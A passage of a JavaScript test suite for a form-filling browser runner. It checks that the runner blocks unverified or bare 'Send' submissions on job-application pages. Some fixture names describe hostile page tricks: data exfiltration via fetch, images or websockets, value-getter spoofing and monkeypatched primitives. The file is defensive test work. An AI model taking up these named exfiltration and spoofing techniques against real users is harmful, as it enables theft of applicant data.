  });
  child.stderr.resume();
  child.stdout.resume();
  return child;
}

const RUNNER_TIMEOUT_MS = 60_000;

function killRunnerProcessGroup(child) {
  if (child.exitCode !== null || child.signalCode !== null) return;
  if (process.platform !== 'win32') {
    try {
      process.kill(-child.pid, 'SIGKILL');
      return;
    } catch (error) {
      if (error?.code !== 'ESRCH') throw error;
    }
  }
  try {
    child.kill('SIGKILL');
  } catch (error) {
    if (error?.code !== 'ESRCH') throw error;
  }
}

function waitForRunner(child, timeoutMs = RUNNER_TIMEOUT_MS) {
  return new Promise((resolve, reject) => {
    let timedOut = false;
    const timer = setTimeout(() => {
      timedOut = true;
      try {
        killRunnerProcessGroup(child);
      } catch (error) {
        reject(error);
      }
    }, timeoutMs);
    child.once('error', (error) => {
      clearTimeout(timer);
      reject(error);
    });
    child.once('close', (status, signal) => {
      clearTimeout(timer);
      resolve({ status, signal, timedOut });
    });
  });
}

async function runRunnerWithTimeout(label, extraEnv = {}, resetAttempt = () => {}) {
  for (let attempt = 1; attempt <= 2; attempt += 1) {
    resetAttempt(attempt);
    const outcome = await waitForRunner(startRunner(extraEnv));
    if (!outcome.timedOut) return outcome.status;
    if (attempt === 1) {
      process.stderr.write(`Runner timed out for ${label}; retrying once.\n`);
    }
  }
  throw new Error(`Runner timed out twice for ${label} after ${RUNNER_TIMEOUT_MS}ms per attempt`);
}

/** Runs the shipped runner against one fixture. Returns the exit code and the result file if any.
 *  'before' is queued ahead of the submit action, which is how a run that actually fills something
 *  is expressed: the fills a real caller sends always precede its final submit. */
async function run(fixture, extras = [], before = []) {
  writeInput(fixture, extras, {}, before);
  const status = await runRunnerWithTimeout(fixture, {}, (attempt) => {
    if (attempt === 1) clicks.length = 0;
    fs.rmSync(resultPath(0), { force: true });
    fs.rmSync(path.join(workDir, 'stratus-error.json'), { force: true });
  });
  return { status, result: readResult(0), clicks: [...clicks] };
}

const V4_APPLICATION_SCOPE_SELECTORS = Object.freeze({
  '/application-feedback-bare-send': '#application_feedback',
  '/application-support-bare-send': '#application_support',
  '/application-profile-bare-send': '#application_profile',
  '/application-status-bare-send': '#application_status',
  '/async-labelled-digit-drift': '#candidate_application',
  '/async-text-drift': '#candidate_application',
  '/candidate-support-bare-send': '#candidate_contact',
  '/choice-drift': '#candidate_application',
  '/confirmation-class-change': '#application_form',
  '/confirmation-consent-drift': '#application_form',
  '/confirmation-external-hidden-drift': '#application_form',
  '/confirmation-file-drift': '#application_form',
  '/confirmation-hidden-drift': '#application_form',
  '/confirmation-sibling-drift': '#application_form',
  '/confirmation-value-drift': '#application_form',
  '/contact-bare-send': '#contact',
  '/custom-submit-choice': '#application_form',
  '/direct-marker-redirect': '#application_form',
  '/external-associated-bare-send': '#application_form',
  '/explicit-submit-only-unrelated-proof': '#application_form',
  '/external-required-control': '#application_form',
  '/failed-choice-replace': '#application_form',
  '/failed-choice-strip': '#application_form',
  '/failed-text-persistence': '#candidate_application',
  '/fill-by-date-normalization': '#application_form',
  '/fill-by-inferred-date-normalization': '#application_form',
  '/fill-by-phone-format': '#application_form',
  '/fill-by-inferred-phone-format': '#application_form',
  '/fill-by-select-label': '#application_form',
  '/fill-by-select-punctuation': '#application_form',
  '/fill-by-target-swap': '#application_form',
  '/fill-target-swap': '#application_form',
  '/forged-success-markers': '#application_form',
  '/history-parity': '#application',
  '/initial-redirect': '#application_form',
  '/job-alert-bare-send': '#job-alert',
  '/late-bare-reparent': '#application_form',
  '/late-base-href-drift': '#application_form',
  '/late-explicit-reparent': '#application_form',
  '/minimal-file-drift': '#application_form',
  '/native-activation-cached-direct-decoy': '#application_form',
  '/native-activation-cached-direct-real': '#application_form',
  '/native-activation-click': '#application_form',
  '/native-activation-focus': '#application_form',
  '/native-activation-iframe-clone': '#application_form',
  '/native-activation-mousedown': '#application_form',
  '/native-activation-normal': '#application_form',
  '/native-activation-pointerdown': '#application_form',
  '/native-activation-submit-action': '#application_form',
  '/native-activation-submit-association': '#application_form',
  '/native-activation-submit-aria-required': '#application_form',
  '/native-activation-submit-star-marker': '#application_form',
  '/native-activation-submit-cancel-direct-real': '#application_form',
  '/native-activation-pre-arm-required': '#application_form',
  '/native-activation-synthetic-witness': '#application_form',
  '/workable-native-allowlist-empty': '#application',
  '/native-constraint-custom-validity-clear': '#application_form',
  '/native-constraint-pattern-removal': '#application_form',
  '/native-formdata-crypto-monkeypatch': '#application_form',
  '/native-page-state-forgery': '#application_form',
  '/native-file-byte-substitution': '#application_form',
  '/native-text-value-getter-spoof': '#application_form',
  '/native-select-value-getter-spoof': '#application_form',
  '/native-textarea-whitespace-drift': '#application_form',
  '/native-hidden-choice-label-spoof': '#application_form',
  '/native-legacy-verifier-write-drift': '#application_form',
  '/native-main-world-primordial-patches': '#application_form',
  '/native-nameless-proof-controls': '#application_form',
  '/native-multi-select-injection': '#application_form',
  '/native-form-owner-getter-spoof': '#application_form',
  '/native-forged-submit-label': '#application_form',
  '/native-hidden-submit-text': '#application_form',
  '/native-opacity-zero-submit': '#application_form',
  '/native-optin-value-getter-spoof': '#application_form',
  '/native-required-selector-spoof': '#application_form',
  '/native-custom-required-selector-spoof': '#application_form',
  '/native-custom-required-aria-only': '#application_form',
  '/native-required-class-marker-spoof': '#application_form',
  '/native-required-star-marker-spoof': '#application_form',
  '/native-required-unassociated-star-marker-spoof': '#application_form',
  '/native-required-disabled-choice-peer': '#application_form',
  '/native-required-native-disabled-choice-peer': '#application_form',
  '/native-required-mixed-choice-peer': '#application_form',
  '/native-required-disabled-option': '#application_form',
  '/native-required-disabled-optgroup': '#application_form',
  '/native-required-native-disabled-option': '#application_form',
  '/native-required-native-disabled-optgroup': '#application_form',
  '/native-required-empty-option': '#application_form',
  '/native-optional-hidden-star': '#application_form',
  '/native-starred-legend-empty': '#application_form',
  '/native-starred-legend-answered': '#application_form',
  '/native-starred-legend-hidden-backing': '#application_form',
  '/native-custom-required-mixed-group': '#application_form',
  '/native-custom-required-display-contents': '#application_form',
  '/native-custom-required-oversized-owner': '#application_form',
  '/native-barred-required-controls': '#application_form',
  '/native-external-custom-required-empty': '#application_form',
  '/native-external-custom-required-answered': '#application_form',
  '/native-external-marker-required-empty': '#application_form',
  '/native-external-aria-owns-empty': '#application_form',
  '/native-external-aria-owns-answered': '#application_form',
  '/native-required-fieldset-empty': '#application_form',
  '/native-required-fieldset-answered': '#application_form',
  '/native-aria-label-drift': '#application_form',
  '/native-aria-label-choice-proof': '#application_form',
  '/native-unselected-image-control': '#application_form',
  '/native-userinfo-action': '#application_form',
  '/native-late-file-getter-substitution': '#application_form',
  '/native-reversible-file-proof-swap': '#application_form',
  '/native-multipart-serializer': '#application_form',
  '/native-multipart-serializer-empty': '#application_form',
  '/native-get-exfil-fetch': '#application_form',
  '/native-get-exfil-image': '#application_form',
  '/native-get-exfil-activation-delayed': '#application_form',
  '/native-websocket-pre-chooser': '#application_form',
  '/native-websocket-activation': '#application_form',
  '/native-rtc-pre-chooser': '#application_form',
  '/native-webtransport-activation': '#application_form',
  '/native-websocketstream-pre-chooser': '#application_form',
  '/native-websocketstream-activation': '#application_form',
  '/native-serviceworker-pre-chooser': '#application_form',
  '/native-popup-route-invisible': '#application_form',
  '/native-document-open-popup': '#application_form',
  '/native-data-frame-hint': '#application_form',
  '/native-data-popup-hint': '#application_form',
  '/native-initial-script-transport': '#application_form',
  '/native-dns-prefetch-pre-chooser': '#application_form',
  '/native-preconnect-activation': '#application_form',
  '/native-connected-rel-pre-chooser': '#application_form',
  '/native-connected-rel-list-activation': '#application_form',
  '/native-shadow-hint-inner-html': '#application_form',
  '/native-closed-shadow-replace-children': '#application_form',
  '/native-closed-shadow-large-fragment': '#application_form',
  '/native-closed-shadow-entity-inner-html': '#application_form',
  '/native-closed-shadow-attr-node-value': '#application_form',
  '/native-closed-shadow-named-node-map': '#application_form',
  '/native-variadic-document-write': '#application_form',
  '/native-nested-iframe-srcdoc': '#application_form',
  '/native-move-before-hint': '#application_form',
  '/native-exec-command-hint': '#application_form',
  '/native-stateful-rel-coercion': '#application_form',
  '/native-safe-string-replace-children': '#application_form',
  '/native-safe-class-list-token': '#application_form',
  '/native-safe-markup-primitives': '#application_form',
  '/native-shadow-href-attribute': '#application_form',
  '/native-shadow-href-named-map': '#application_form',
  '/native-shadow-url-component': '#application_form',
  '/native-cross-site-cookie': '#application_form',
  '/native-get-unsupported': '#application_form',
  '/native-redirect-preserve-method': '#application_form',
  '/native-redirect-receipt': '#application_form',
  '/native-redirect-userinfo-receipt': '#application_form',
  '/native-redirect-cookie-receipt': '#application_form',
  '/native-redirect-fragment-receipt': '#application_form',
  '/native-serializer-empty-file': '#application_form',
  '/native-serializer-populated-file': '#application_form',
  '/native-validation-formnovalidate': '#application_form',
  '/native-validation-novalidate': '#application_form',
  '/over-bound-submitted-state': '#application_form',
  '/pre-chooser-base-drift': '#application_form',
  '/pre-chooser-method-drift': '#application_form',
  '/reactivated-unrelated-form': '#application_form',
  '/reparent-drift': '#application_source',
  '/selector-id-transfer': '#application_source',
  '/select-target-swap': '#application_form',
  '/shadow-bare-send': '#application_form',
  '/talent-pool-bare-send': '#talent-network',
  '/text-repurpose-drift': '#application_form',
  '/upload-target-swap': '#application_form',
  '/url-hop-start': '#candidate_application',
  '/whole-form-failed-choice': '#application_form',
  '/workable-ambiguous-send': '#application',
  '/workable-activation-click-drift': '#application',
  '/workable-activation-pointer-drift': '#application',
  '/workable-association-decoy': '#application',
  '/workable-bare-send': '#application',
  '/workable-base-target': '#application',
  '/workable-control-state-drift': '#application',
  '/workable-disabled-external-submit': '#application',
  '/workable-explicit-associated-decoy': '#application',
  '/workable-explicit-override': '#application',
  '/workable-explicit-role': '#application',
  '/workable-explicit-wins': '#application',
  '/workable-external-submit': '#application',
  '/workable-form-drift': '#application',
  '/workable-form-target': '#application',
  '/workable-formaction-override': '#application',
  '/workable-proof-loss-explicit-decoy': '#application',
  '/workable-prechooser-auto-submit': '#application',
  '/workable-role-send': '#application',
  '/workable-unrelated-form': '#application',
  '/workable-native-allowlist': 'form:has(input[name="firstname"]):has(input[name="email"]):has(input[type="file"][data-ui="resume"])'
});

const V4_INTENTIONALLY_UNBOUND_FIXTURES = new Set(['/ashby']);

function v4ApplicationScopeFor(fixture) {
  const fixturePath = fixture.split('?')[0];
  if (Object.hasOwn(V4_APPLICATION_SCOPE_SELECTORS, fixturePath)) {
    return V4_APPLICATION_SCOPE_SELECTORS[fixturePath];
  }
  if (V4_INTENTIONALLY_UNBOUND_FIXTURES.has(fixturePath)) return null;
  throw new Error('runV4 fixture must declare an application scope classification: ' + fixturePath);
}

async function runV4(
  fixture,
  before = [],
  extras = [],
  origin = `http://127.0.0.1:${server.address().port}`,
  runnerEnv = {}
) {
  const expectedPageUrl = origin + fixture;
  const applicationScopeSelector = v4ApplicationScopeFor(fixture);
  const v4Submit = {
    ...submitAction,
    chooserPolicy: ATOMIC_SUBMIT_POLICY_V4,
    expectedPageUrl
  };
  fs.writeFileSync(path.join(workDir, 'stratus-input.json'), JSON.stringify({
    url: expectedPageUrl,
    actions: [
      { type: 'requireCapability', value: EXACT_PAGE_URL_CAPABILITY, optional: false, expectedPageUrl },
      {
        type: 'requireCapability',
        value: ATOMIC_SUBMIT_V4_CAPABILITY,
        optional: false,
        ...(applicationScopeSelector ? { applicationScopeSelector } : {})
      },
      ...before,
      v4Submit,
      { type: 'extract', selector: '#submitted' },
      ...extras
    ],
    allowSubmit: true,
    providerDeadlineAt: providerDeadlineAt(),
    screenshot: true,
    waitUntil: 'networkidle',
    viewport: { width: 1440, height: 900 }
  }));
  const status = await runRunnerWithTimeout(fixture, runnerEnv, (attempt) => {
    if (attempt === 1) {
      clicks.length = 0;
      transportRequests.length = 0;
      getExfilRequests.length = 0;
      websocketConnections.length = 0;
      websocketFrames.length = 0;
    }
    fs.rmSync(resultPath(0), { force: true });
    fs.rmSync(path.join(workDir, 'stratus-error.json'), { force: true });
    fs.rmSync(path.join(workDir, 'stratus-screenshot-0.png'), { force: true });
  });
  const errorFile = path.join(workDir, 'stratus-error.json');
  return {
    status,
    result: readResult(0),
    error: fs.existsSync(errorFile) ? JSON.parse(fs.readFileSync(errorFile, 'utf8')) : null,
    clicks: [...clicks],
    requests: [...transportRequests],
    getExfilRequests: [...getExfilRequests],
    websocketConnections: [...websocketConnections],
    websocketFrames: [...websocketFrames],
    screenshot: fs.existsSync(path.join(workDir, 'stratus-screenshot-0.png'))
  };
}

async function runV3Prepare(fixture, actions) {
  const expectedPageUrl = `http://127.0.0.1:${server.address().port}${fixture}`;
  fs.writeFileSync(path.join(workDir, 'stratus-input.json'), JSON.stringify({
    url: expectedPageUrl,
    actions: [
      { type: 'requireCapability', value: EXACT_PAGE_URL_CAPABILITY, optional: false, expectedPageUrl },
      ...actions
    ],
    allowSubmit: false,
    providerDeadlineAt: providerDeadlineAt(),
    screenshot: false,
    waitUntil: 'networkidle',
    viewport: { width: 1440, height: 900 }
  }));
  const status = await runRunnerWithTimeout(fixture, {}, (attempt) => {
    if (attempt === 1) clicks.length = 0;
    fs.rmSync(resultPath(0), { force: true });
    fs.rmSync(path.join(workDir, 'stratus-error.json'), { force: true });
  });
  return { status, result: readResult(0), clicks: [...clicks] };
}

const valueOf = (result, selector) => result.extracted.find((entry) => entry.selector === selector)?.value;

const recordedMultipartParts = (request) => {
  const boundary = String(request.contentType || '').match(/boundary=(?:"([^"]+)"|([^;\s]+))/i);
  assert.ok(boundary, 'multipart request must carry a boundary');
  const marker = Buffer.from('--' + (boundary[1] || boundary[2]));
  const body = Buffer.from(request.bodyBase64, 'base64');
  const parts = [];
  let cursor = body.indexOf(marker);
  while (cursor !== -1) {
    cursor += marker.length;
    if (body.subarray(cursor, cursor + 2).equals(Buffer.from('--'))) break;
    assert.ok(body.subarray(cursor, cursor + 2).equals(Buffer.from('\r\n')));
    cursor += 2;
    const headerEnd = body.indexOf(Buffer.from('\r\n\r\n'), cursor);
    assert.notEqual(headerEnd, -1);
    const headers = body.subarray(cursor, headerEnd).toString('utf8');
    const next = body.indexOf(Buffer.from('\r\n--' + (boundary[1] || boundary[2])), headerEnd + 4);
    assert.notEqual(next, -1);
    const disposition = headers.split('\r\n').find((line) => /^content-disposition:/i.test(line)) || '';
    const name = disposition.match(/(?:^|;)\s*name="([^"]*)"/i)?.[1];
    const filename = disposition.match(/(?:^|;)\s*filename="([^"]*)"/i)?.[1];
    const type = headers.split('\r\n').find((line) => /^content-type:/i.test(line));
    parts.push({
      name,
      ...(filename == null ? {} : { filename }),
      ...(type ? { contentType: type.slice(type.indexOf(':') + 1).trim() } : {}),
      bytesBase64: body.subarray(headerEnd + 4, next).toString('base64')
    });
    cursor = next + 2;
  }
  return parts;
};

const multipartTextPart = (name, value) => ({
  name,
  bytesBase64: Buffer.from(value).toString('base64')
});

const multipartFilePart = (name, filename = 'resume.pdf', bytes = Buffer.from('resume')) => ({
  name,
  filename,
  contentType: filename ? 'application/pdf' : 'application/octet-stream',
  bytesBase64: bytes.toString('base64')
});

const assertMultipartPost = (request, pathName, expectedParts) => {
  assert.equal(request?.method, 'POST');
  assert.equal(request?.path, pathName);
  assert.match(String(request?.contentType || ''), /^multipart\/form-data;/i);
  assert.deepEqual(recordedMultipartParts(request), expectedParts);
};

test.after(() => {
  for (const client of webSocketServer.clients) client.terminate();
  webSocketServer.close();
  server.close();
  fs.rmSync(workDir, { recursive: true, force: true });
});

const workableV4Fills = () => [
  { type: 'fill', selector: '#first-name', value: 'Mehek', label: 'first_name' },
  { type: 'fill', selector: '#last-name', value: 'Mandal', label: 'last_name' },
  { type: 'fill', selector: '#email', value: 'applicant@example.com', label: 'email' },
  {
    type: 'upload',
    selector: '#resume',
    label: 'resume',
    file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
  }
];

const minimalV4Fills = (emailSelector, resumeSelector) => [
  { type: 'fill', selector: emailSelector, value: 'applicant@example.com', label: 'email' },
  {
    type: 'upload',
    selector: resumeSelector,
    label: 'resume',
    file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
  }
];

const nativeSerializerV4Fills = (populateFile) => [
  { type: 'fill', selector: '#serializer-email', value: 'applicant@example.com', label: 'email' },
  { type: 'fillByLabelText', text: 'Preferred role', value: 'Engineering', label: 'preferred_role' },
  ...(populateFile ? [{
    type: 'upload',
    selector: '#serializer-resume',
    label: 'resume',
    file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
  }] : [])
];

const assertScriptInterceptedNativeTransport = (result) => {
  assert.ok(result?.requiredFieldConfirmation, JSON.stringify(result, null, 2));
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unsupported');
  assert.equal(result.finalSubmitChooser.outcome, 'transport_unsupported');
};

const assertScriptInterceptedPostTransport = (result) => {
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unpinned');
  assert.equal(result.finalSubmitChooser.outcome, 'activation_blocked');
};

const assertUnsupportedNativeSubmitter = (result) => {
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unsupported');
  assert.equal(result.finalSubmitChooser.outcome, 'transport_unsupported');
};

test('v4 blocks a Workable-like bare Send whose form uses unsupported GET transport', async () => {
  const { status, result, error, clicks: recorded, screenshot } = await runV4(
    '/workable-bare-send',
    workableV4Fills()
  );
  assert.equal(status, 0, JSON.stringify({ error, result }));
  assert.deepEqual(recorded, [], JSON.stringify({ result, requests: transportRequests }));
  assert.equal(screenshot, true);
  assertScriptInterceptedNativeTransport(result);
  assert.deepEqual(result.finalSubmitChooser, {
    version: 1,
    policyName: 'litos-final-submit',
    policyVersion: 4,
    grammarHash: ATOMIC_SUBMIT_POLICY_V4.grammarHash,
    submitKind: 'application',
    outcome: 'transport_unsupported',
    candidateCount: 1,
    viableCandidateCount: 1,
    topScore: 0,
    topScoreCount: 1,
    addressedScopeCount: 1,
    bareSendCandidateCount: 1
  });
  assert.equal(result.exactPageUrlProof.beforeFinalChooser, result.exactPageUrlProof.expected);
  assert.equal(result.exactPageUrlProof.beforeSubmit, result.exactPageUrlProof.expected);
});

test('v3 prepare runs retain the old URL-proof shape and never write successful-address markers', async () => {
  const { status, result, clicks: recorded } = await runV3Prepare('/one-field-form', [
    { type: 'fill', selector: '#one-email', value: 'updated@example.com', label: 'email' },
    { type: 'extract', selector: '#one-email', attribute: 'data-litos-successful-address-v1' },
    { type: 'extract', selector: '#one-email', attribute: 'data-litos-successful-address-target-v1' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.deepEqual(Object.keys(result.exactPageUrlProof).sort(), [
    'beforeActions', 'beforeApplicantData', 'beforeSubmit', 'expected'
  ]);
  assert.equal(result.extracted[0].value, null);
  assert.equal(result.extracted[1].value, null);
  assert.equal(result.finalSubmitChooser, undefined);
});

test('v4 returns a screenshot-backed no-click result for a contact form bare Send', async () => {
  const { status, result, clicks: recorded, screenshot } = await runV4(
    '/contact-bare-send',
    [
      { type: 'fill', selector: '#contact-email', value: 'applicant@example.com', label: 'contact_email' },
      { type: 'fill', selector: '#message', value: 'Hello', label: 'message' }
    ],
    [{ type: 'extract', selector: '#contact-email', attribute: 'data-litos-successful-address-v1' }]
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(screenshot, true);
  assertScriptInterceptedNativeTransport(result);
  assert.equal(result.finalSubmitChooser.candidateCount, 1);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
  assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 1);
  assert.equal(result.exactPageUrlProof.beforeFinalChooser, result.exactPageUrlProof.expected);
  assert.equal(valueOf(result, '#contact-email'), null);
});

test('v4 refuses bare Send on a candidate support form', async () => {
  const { status, result, clicks: recorded, screenshot } = await runV4('/candidate-support-bare-send', [
    { type: 'fill', selector: '#support-email', value: 'applicant@example.com' },
    { type: 'fill', selector: '#support-message', value: 'Please help' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(screenshot, true);
  assertScriptInterceptedNativeTransport(result);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
});

test('v4 refuses bare Send on an application feedback form', async () => {
  const { status, result, clicks: recorded } = await runV4('/application-feedback-bare-send', [
    { type: 'fill', selector: '#feedback-email', value: 'applicant@example.com' },
    { type: 'fill', selector: '#feedback-message', value: 'Feedback' },
    {
      type: 'upload', selector: '#feedback-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
});

test('v4 refuses bare Send on a resume-bearing application support form', async () => {
  const { status, result, clicks: recorded } = await runV4('/application-support-bare-send', [
    { type: 'fill', selector: '#application-support-email', value: 'applicant@example.com' },
    {
      type: 'upload', selector: '#application-support-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
});

for (const decoyKind of ['profile', 'status']) {
  test('v4 refuses bare Send on a resume-bearing application ' + decoyKind + ' form', async () => {
    const { status, result, clicks: recorded } = await runV4('/application-' + decoyKind + '-bare-send', [
      { type: 'fill', selector: '#' + decoyKind + '-email', value: 'applicant@example.com' },
      {
        type: 'upload', selector: '#' + decoyKind + '-resume',
        file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
      }
    ]);
    assert.equal(status, 0);
    assert.deepEqual(recorded, []);
    assertScriptInterceptedNativeTransport(result);
    assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
    assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
  });
}

test('v4 accepts fillByLabelText phone formatting as a verified bare-Send proof', async () => {
  const { status, result, clicks: recorded } = await runV4('/fill-by-phone-format', [
    { type: 'fillByLabelText', text: 'Phone', value: '2135746270' },
    {
      type: 'upload', selector: '#phone-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
});

test('v4 accepts inferred type-text phone formatting as a verified bare-Send proof', async () => {
  const { status, result, clicks: recorded } = await runV4('/fill-by-inferred-phone-format', [
    { type: 'fillByLabelText', text: 'Phone', value: '2135746270' },
    {
      type: 'upload', selector: '#phone-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
});

test('v4 accepts a native option label as a verified bare-Send proof', async () => {
  const { status, result, clicks: recorded } = await runV4('/fill-by-select-label', [
    { type: 'fillByLabelText', text: 'Department', value: 'engineering' },
    {
      type: 'upload', selector: '#select-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
});

test('v4 does not authorize a punctuation-different single native option as the requested proof', async () => {
  const { status, result, clicks: recorded } = await runV4('/fill-by-select-punctuation', [
    { type: 'fillByLabelText', text: 'Experience', value: '10' },
    {
      type: 'upload', selector: '#punctuation-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
});

test('v4 invalidates a native select proof when only its selected option label changes', async () => {
  const { status, result, clicks: recorded } = await runV4('/fill-by-select-label', [
    { type: 'fillByLabelText', text: 'Department', value: 'Engineering' },
    {
      type: 'upload', selector: '#select-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    },
    { type: 'click', selector: '#mutate-select-label' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
});

test('v4 accepts a normalized date control as a verified bare-Send proof', async () => {
  const { status, result, clicks: recorded } = await runV4('/fill-by-date-normalization', [
    { type: 'fillByLabelText', text: 'Graduation date', value: 'May 2028' },
    {
      type: 'upload', selector: '#date-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
});

test('v4 accepts inferred type-text datepicker normalization as a verified bare-Send proof', async () => {
  const { status, result, clicks: recorded } = await runV4('/fill-by-inferred-date-normalization', [
    { type: 'fillByLabelText', text: 'Graduation date', value: 'May 2028' },
    {
      type: 'upload', selector: '#date-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
});

test('v4 invalidates a normalized date proof that moves to another calendar point', async () => {
  const { status, result, clicks: recorded } = await runV4('/fill-by-date-normalization', [
    { type: 'fillByLabelText', text: 'Graduation date', value: 'May 2028' },
    {
      type: 'upload', selector: '#date-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    },
    { type: 'click', selector: '#mutate-date' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
});

test('v4 does not let one successful email fill authorize an application-looking bare Send', async () => {
  const { status, result, clicks: recorded } = await runV4('/workable-bare-send', [
    { type: 'fill', selector: '#email', value: 'applicant@example.com', label: 'email' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
});

test('v4 records successful unlabeled fills as chooser proofs', async () => {
  const { status, result, clicks: recorded } = await runV4('/workable-bare-send', [
    { type: 'fill', selector: '#first-name', value: 'Mehek' },
    { type: 'fill', selector: '#last-name', value: 'Mandal' },
    {
      type: 'upload', selector: '#resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.finalSubmitChooser.outcome, 'selected');
  assert.equal(result.finalSubmitChooser.topScore, 0);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
});

test('v4 never records a nonempty but different failed text persistence as proof', async () => {
  const { status, result, clicks: recorded, screenshot } = await runV4('/failed-text-persistence', [
    { type: 'fill', selector: '#candidate-name', value: 'Mehek', label: 'first_name' },
    {
      type: 'upload', selector: '#candidate-resume', label: 'resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(screenshot, true);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.candidateCount, 0);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
  assert.equal(result.exactPageUrlProof.beforeFinalChooser, result.exactPageUrlProof.expected);
});

test('v4 rechecks action intent when an async repaint follows successful text verification', async () => {
  const { status, result, clicks: recorded } = await runV4('/async-text-drift', [
    { type: 'fill', selector: '#candidate-name', value: 'Mehek' },
    {
      type: 'upload', selector: '#candidate-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
    }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
});

test('v4 does not treat labelled 10 and already-repainted 10+ as the same proof', async () => {
  const { status, result, clicks: recorded } = await runV4('/async-labelled-digit-drift', [
    { type: 'fillByLabelText', text: 'Years of experience', value: '10' },
    {
      type: 'upload', selector: '#digit-resume',
      file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
